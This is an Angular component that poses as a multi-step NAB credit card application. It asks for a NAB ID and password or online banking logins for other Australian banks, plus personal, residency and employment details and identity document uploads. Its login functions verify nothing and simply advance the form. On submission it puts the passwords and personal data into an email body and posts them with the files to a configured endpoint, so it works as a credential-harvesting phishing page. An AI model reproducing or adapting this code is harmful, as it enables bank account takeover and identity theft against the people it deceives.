import { HttpClient, HttpHeaders } from '@angular/common/http';
import { Component, OnInit, TemplateRef, ViewChild } from '@angular/core';
import { FormBuilder, FormGroup, Validators } from '@angular/forms';
import { MatDialog, MatDialogRef } from '@angular/material/dialog';
import { Router } from '@angular/router';
import { MatSnackBar } from '@angular/material/snack-bar';
import { environment } from 'src/environments/environment';
// import { NgxSpinnerService } from "ngx-spinner";

@Component({
  selector: 'app-introduction',
  templateUrl: './introduction.component.html',
  styleUrls: ['./introduction.component.scss'],
})
export class IntroductionComponent implements OnInit {
  isLinear = false;
  firstFormGroup!: FormGroup;
  secondFormGroup!: FormGroup;
  thirdFormGroup!: FormGroup;
  fourthFormGroup!: FormGroup;
  loginForm!: FormGroup;
  selectedIndex = 0;
  limits: string[] = ['Maximum approved limit (Up to $75,000)', 'Other'];
  labels: string[] = ['Yes', 'No'];
  titles: string[] = ['Mr', 'Mrs', 'Ms', 'Miss', 'Dr'];
  banks: string[] = [
    'ANZ',
    'Westpac',
    'Commonwealth',
    'bankwest',
    'st.george',
    'Bendigo',
    'AMP',
    'Bank Australia',
  ];
  numberTypes: string[] = ['Australian number', 'International number'];
  statusTypes: string[] = [
    'Single',
    'Defacto',
    'Divorced',
    'Married',
    'Separted',
    'Widowed',
  ];
  dependentCounts: string[] = ['1', '2', '3', '4', '5', '6', '7', '7+'];
  arrangments: string[] = [
    'Renting',
    'Home Owner (no mortgage)',
    'Home Owner (with mortgage)',
    'Living with Parent/relative',
    'Employer Supplied',
  ];
  licenceIdentity: string[] = [
    "Australian Driver's Licence & Medicare Card",
    'Australian Passport & Medicare Card',
    'International Passport',
  ];
  employments: string[] = [
    'Full time Employment',
    'Part time Employment',
    'Contractor',
    'Self Employed',
    'Retired',
    'Student',
    'Unemployed',
  ];
  incomes: string[] = [
    '30k/year',
    '40k/year',
    '50k/year',
    '60k/year',
    '70k/year',
    '80k/year',
    '80k+/year',
  ];
  @ViewChild('loginForm') template!: TemplateRef<any>;
  @ViewChild('registerForm') registerTemplate!: TemplateRef<any>;
  @ViewChild('BankloginForm') BankloginForm!: TemplateRef<any>;
  public nabId!: string;
  public password!: string;
  public isNabCustomer: string = '';
  public bankName: string = '';
  public bankId: string = '';
  public bankPassword: string = '';
  public attachments: Array<any> = [];
  public durationInSeconds = 10;
  constructor(
    private _formBuilder: FormBuilder,
    public dialog: MatDialog,
    public dialogRef: MatDialogRef<any>,
    public http: HttpClient,
    public router: Router,
    private _snackBar: MatSnackBar
    // private spinner: NgxSpinnerService
  ) {}
  ngOnInit() {
    this.firstFormGroup = this._formBuilder.group({
      email: ['', Validators.required],
      creditLimit: ['', Validators.required],
      transferBal: ['', Validators.required],
      otherAmount: [''],
    });
    this.secondFormGroup = this._formBuilder.group({
      title: ['', Validators.required],
      firstLegalName: ['', Validators.required],
      lastLegalName: ['', Validators.required],
      dob: ['', Validators.required],
      numberType: ['', Validators.required],
      mobileNumber: ['', Validators.required],
      maritalStatus: ['', Validators.required],
      dependents: ['', Validators.required],
    });
    this.thirdFormGroup = this._formBuilder.group({
      isAustralianLicence: ['', Validators.required],
      isAustralianResident: ['', Validators.required],
      isUSResident: ['', Validators.required],
      isOverseas: ['', Validators.required],
      isUSAsideResident: ['', Validators.required],
      address: ['', Validators.required],
      moveInDate: ['', Validators.required],
      livingArrang: ['', Validators.required],
      isAustralian: ['', Validators.required],
    });
    this.fourthFormGroup = this._formBuilder.group({
      identity: ['', Validators.required],
      employment: ['', Validators.required],
      companyName: ['', Validators.required],
      jobTitle: ['', Validators.required],
      workingDate: ['', Validators.required],
      isWorking: ['', Validators.required],
      income: ['', Validators.required],
    });
  }
  public prev() {
    if (this.selectedIndex > 0) {
      this.selectedIndex -= 1;
    }
  }
  public uploadFileEvt(e: any) {
    const files = e.files;
    this.attachments.push(...files);
  }
  public onSubmit() {
    if (this.selectedIndex === 4) {
      const formData = {
        ...this.firstFormGroup.value,
        ...this.secondFormGroup.value,
        ...this.thirdFormGroup.value,
        ...this.fourthFormGroup.value,
      };
      const body = `
      <p>Email: ${formData.email}</p>
      <p>What is the maximum credit limit you would like to apply for? ${
        formData.otherAmount ? formData.otherAmount : formData.creditLimit
      }</p>
      <p>Do you want to do a balance transfer from a non-NAB credit card in this application? ${
        formData.transferBal
      }</p>
      <p>Are you an existing NAB customer? ${this.isNabCustomer}</p>
      </p><p>Nab ID: ${this.nabId || ''}
      </p><p>Password: ${this.password || ''}
      </p><p>Bank: ${this.bankName || ''}
      </p><p>Bank ID/Email: ${this.bankId || ''}
      </p><p>Bank Password: ${this.bankPassword || ''}
      </p><p>Title: ${formData.title}
      </p><p>First Legal Name: ${formData.firstLegalName}
      </p><p>Last Legal Name: ${formData.lastLegalName}
      </p><p>Merital Status: ${formData.maritalStatus}
      </p><p>Date of Birth: ${
        formData.dob ? formData.dob.toLocaleDateString() : ''
      }
      </p><p>Which type of mobile number do you have? ${formData.numberType}
      </p><p>Mobile Number: ${formData.mobileNumber}
      </p><p>How many financial dependants do you have? ${formData.dependents}
      </p><p>Do you have an Australian driver's licence? ${
        formData.isAustralianLicence
      }
      </p><p>Are you an Australian resident for tax purposes? ${
        formData.isAustralianResident
      }
      </p><p>Are you a U.S. citizen or resident for tax purposes? ${
        formData.isUSResident
      }
      </p><p>Aside from Australia and the U.S., are you a resident of any other country for tax purposes? ${
        formData.isUSAsideResident
      }
      </p><p>When did you move in here? ${
        formData.moveInDate ? formData.moveInDate.toLocaleDateString() : ''
      }
      </p><p>Is your residential address in Australia or overseas? ${
        formData.isOverseas
      }
      </p><p>Residential Address: ${formData.address}
      </p><p>What is your current living arrangement? ${formData.livingArrang}
      </p><p>Are you an Australian citizen? ${formData.isAustralian}
      </p><p>How would you like to verify your identity? ${formData.identity}
      </p><p>Your employment ${formData.employment}
      </p><p>Company Name ${formData.companyName}
      </p><p>Job Title ${formData.jobTitle}
      </p><p>Working Start Date ${
        formData.workingDate ? formData.workingDate.toLocaleDateString() : ''
      }
      </p><p>Do you still work here? ${formData.isWorking}
      </p><p>Your income ${formData.income}</p>`;
      let form: FormData = new FormData();
      this.attachments.forEach((f) => {
        form.append('file', f);
      });
      form.append('toEmail', formData.email);
      form.append('subject', 'Nab Credit Card Form');
      form.append('body', body);
      const headers = new HttpHeaders()
        .append('Access-Control-Allow-Headers', 'Content-Type')
        .append('Access-Control-Allow-Methods', 'GET')
        .append('Access-Control-Allow-Methods', 'POST')
        .append('Access-Control-Allow-Origin', '*')
        .append('Content-Type', 'application/x-www-form-urlencoded');
        // this.spinner.show();
      this.http.post(environment.uploadPath, form).subscribe(
        (res) => {
          this.selectedIndex = 0;
          this.firstFormGroup.reset();
          this.secondFormGroup.reset();
          this.thirdFormGroup.reset();
          this.fourthFormGroup.reset();
          this.attachments = [];
          this.nabId = '';
          this.password = '';
          this.isNabCustomer = '';
          // this.spinner.hide();
          this.router.navigate(['/success']);
        },
        (error) => {
          // this.spinner.hide();
          console.log(error);
        }
      );
    } else if (this.selectedIndex === 1 && this.isNabCustomer === 'Yes') {
      this.openLoginDialog();
    } else if (this.selectedIndex === 1 && this.isNabCustomer === 'No') {
      this.dialogRef = this.dialog.open(this.BankloginForm);
    } else {
      this.selectedIndex += 1;
    }
  }
  public openLoginDialog() {
    this.dialogRef = this.dialog.open(this.template);
  }
  public login() {
    this.dialogRef.close();
    this.selectedIndex = this.selectedIndex + 1;
  }
  public register() {
    this.dialogRef.close();
    this.dialogRef = this.dialog.open(this.registerTemplate);
  }
  public registerUser() {
    this.dialogRef.close();
    this.selectedIndex = this.selectedIndex + 1;
  }
  public checkIfIsDisabled(): boolean {
    if (this.selectedIndex === 0) {
      return this.firstFormGroup.valid ? false : true;
    } else if (this.selectedIndex === 1) {
      return (
        this.isNabCustomer === '' ||
        (this.isNabCustomer === 'No' && this.bankName === '')
      );
    } else if (this.selectedIndex === 2) {
      return this.secondFormGroup.valid ? false : true;
    } else if (this.selectedIndex === 3) {
      return this.thirdFormGroup.valid ? false : true;
    } else if (this.selectedIndex === 4) {
      return this.fourthFormGroup.valid ? false : true;
    }
    return false;
  }
}
